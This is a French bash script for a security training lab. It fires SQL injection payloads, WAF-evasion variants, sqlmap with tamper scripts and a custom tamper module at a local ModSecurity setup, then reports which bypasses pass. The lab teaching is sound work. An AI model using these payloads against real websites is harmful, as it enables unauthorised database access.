#!/bin/bash
# =====================================================================
# lab_waf_bypass.sh — J3 : Contournement WAF ModSecurity
#   Cible : WAF sur port 8081 (proxy) → sqli-app sur port 8083
#   Techniques : XOR, ||, &&, HPP, opérateurs alternatifs, sqlmap tamper
# =====================================================================
set -uo pipefail
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
cd "$(dirname "$0")"

WAF_URL="http://127.0.0.1:8081"
SQLI_APP_URL="http://127.0.0.1:8083"
WAF="${WAF_URL}/?id="

AUTO=0
[ "${1:-}" = "-y" ] && AUTO=1
prompt() { [ "$AUTO" = 1 ] && return 0; echo -e "\n$1"; read -r; }

echo "============================================================"
echo "  J3 - Contournement WAF ModSecurity + CRS"
echo "============================================================"
echo "  WAF  : $WAF_URL"
echo "  Backend (direct) : $SQLI_APP_URL"
echo ""

# ------------------------------------------------------------------
# 3.1 — SQLi direct (sans WAF)
# ------------------------------------------------------------------
echo "--- 3.1 — SQLi direct (sans WAF) ---"
echo "[*] Test : injection directe sur sqli-app (port 8083)..."
DIRECT_RES=$(curl -s -o /dev/null -w "%{http_code}" "${SQLI_APP_URL}/?id=1+OR+1=1")
echo "  HTTP $DIRECT_RES ($([ "$DIRECT_RES" = "200" ] && echo 'OK' || echo 'BLOQUE'))"
prompt "Continuer ?"

# ------------------------------------------------------------------
# 3.2 — WAF bloque l'injection standard
# ------------------------------------------------------------------
echo "--- 3.2 — WAF bloque l'injection standard ---"
for test in "1+OR+1=1" "1'+OR+'1'='1" "1+AND+1=1"; do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" "${WAF}${test}")
  echo "  ${test} -> HTTP $CODE ($([ "$CODE" = "403" ] && echo 'BLOQUE' || echo 'PASSE'))"
done
prompt "Continuer ?"

# ------------------------------------------------------------------
# 3.3 — Bypass par opérateurs alternatifs
# ------------------------------------------------------------------
echo "--- 3.3 — Bypass par opérateurs alternatifs ---"
for test in \
  "1+OR+1" "1+AND+1" "1+LIKE+1" "1+IN+(1)" \
  "1+IS+TRUE" "1+RLIKE+1" "1+NOT+LIKE+2" \
  "1%5e1" "1%7c%7c1" "1%26%261"; do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" "${WAF}${test}")
  STATUS="PASSE"
  [ "$CODE" = "403" ] && STATUS="BLOQUE"
  echo "  ${test} -> HTTP $CODE ($STATUS)"
done
prompt "Continuer ?"

# ------------------------------------------------------------------
# 3.4 — Bypass par encodage HTTP (inefficace avec CRS moderne)
# ------------------------------------------------------------------
echo "--- 3.4 — Encodage HTTP (inefficace avec CRS moderne) ---"
for test in \
  "%31%20%4f%52%20%31%3d%31" `# 1 OR 1=1 en hex` \
  "1+%4fR+1=1" `# OR partiellement encodé` \
  "1+OR/**/1=1" `# commentaire dans OR`; do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" "${WAF}${test}")
  STATUS="PASSE"
  [ "$CODE" = "403" ] && STATUS="BLOQUE"
  echo "  ${test} -> HTTP $CODE ($STATUS)"
done
prompt "Continuer ?"

# ------------------------------------------------------------------
# 3.5 — Bypass UNIVERS SELECT (variantes)
# ------------------------------------------------------------------
echo "--- 3.5 — Tentatives bypass UNION SELECT ---"
for payload in \
  "1+UNION%09SELECT+1,2,3" \
  "1+UNION/**/SELECT+1,2,3" \
  "1+/*!UNION*/+/*!SELECT*/+1,2,3" \
  "1+union+select+1,2,3" \
  "0||(union(select(1),(2),(3)))"; do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" "${WAF}${payload}")
  echo "  $payload -> HTTP $CODE ($([ "$CODE" = "403" ] && echo 'BLOQUE' || echo 'PASSE'))"
done
echo "[*] UNION SELECT bloque par toutes les variantes avec CRS recent"
prompt "Continuer ?"

# ------------------------------------------------------------------
# 3.6 — sqlmap avec tamper scripts
# ------------------------------------------------------------------
echo "--- 3.6 — sqlmap avec tamper scripts ---"
echo "[*] Les tampers classiques (space2comment, charencode, randomcase) sont inefficaces"
echo "[*] contre le CRS moderne (libinjection + regex)."
echo ""
echo "Commande de reference :"
echo "  sqlmap -u \"${WAF_URL}/?id=1\" --batch --level=2 \\"
echo "    --tamper=between,randomcase,space2comment,space2plus \\"
echo "    --random-agent --flush-session"
echo ""
echo "[*] Test rapide sqlmap avec space2comment..."
sqlmap -u "${WAF_URL}/?id=1" --batch --level=1 \
  --tamper=space2comment --random-agent \
  --flush-session 2>&1 | grep -E "(WAF|injectable|INFO:|CRITICAL|testing)" | head -10
prompt "Terminer ?"

# ------------------------------------------------------------------
# 3.7 — Tamper personnalisé (si sqlmap a détecté l'injection)
# ------------------------------------------------------------------
echo "--- 3.7 — Tamper personnalisé (modele) ---"
cat << 'EOF'
# custom_tamper.py — remplace OR/AND par ||/&&
from lib.core.enums import PRIORITY
priority = PRIORITY.LOW

def tamper(payload, **kwargs):
    payload = payload.replace("OR ", "|| ").replace("AND ", "&& ")
    return payload
EOF
echo ""
echo "Usage : sqlmap -u '...' --tamper=custom_tamper"

# ------------------------------------------------------------------
echo ""
echo "============================================================"
echo "  Resume des bypass :"
echo "  PASSE WAF : OR, AND, LIKE, IN (), IS TRUE, RLIKE, NOT LIKE"
echo "  PASSE WAF : XOR (^), OR (||), AND (&&)"
echo "  BLOQUE    : UNION SELECT (toutes variantes)"
echo "  BLOQUE    : encodage URL / case / commentaires"
echo "  --------------------------------------------------------"
echo "  Libinjection et les regex CRS detectent le fond, pas la forme"
echo "============================================================"
